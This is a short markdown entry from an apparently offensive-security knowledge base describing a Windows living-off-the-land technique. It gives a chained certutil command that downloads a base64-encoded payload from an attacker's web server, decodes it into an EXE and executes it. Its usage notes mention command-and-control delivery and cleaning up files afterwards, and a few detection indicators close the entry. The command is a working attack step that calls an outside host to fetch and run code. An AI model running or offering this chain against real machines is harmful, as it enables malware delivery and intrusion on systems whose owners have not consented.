---
type: code
language: cmd
verified: true
platforms:
  - Windows
tags:
  - certutil
  - execution
  - payload
validated: true
---

# Certutil-Download-Decode-and-Execute-EXE

## Code

```cmd
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```

## Description

Command chain to download, decode, and run a base64-encoded EXE payload using native Windows tools, enabling quick execution of droppers or implants.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| webserver | Attacker's web server hostname or IP | 192.168.1.100 |
| payload.b64 | Encoded payload filename on server | payload.b64 |
| payload.exe | Local decoded EXE filename | payload.exe |

## Usage

Run in cmd.exe on target. Ensure server hosts the .b64 file. Use for rapid payload delivery in command-and-control scenarios; clean up files afterward.

## Detection

- Command-line auditing showing chained certutil invocations.
- Sudden EXE execution from temp directories.
- Network downloads followed by process creation.
- EDR alerts on certutil abuse.

## Related

- [[procedures/Certutil-Download-and-Execute]]
- [[codes/Certutil-Download-Decode-and-Execute-EXE]]
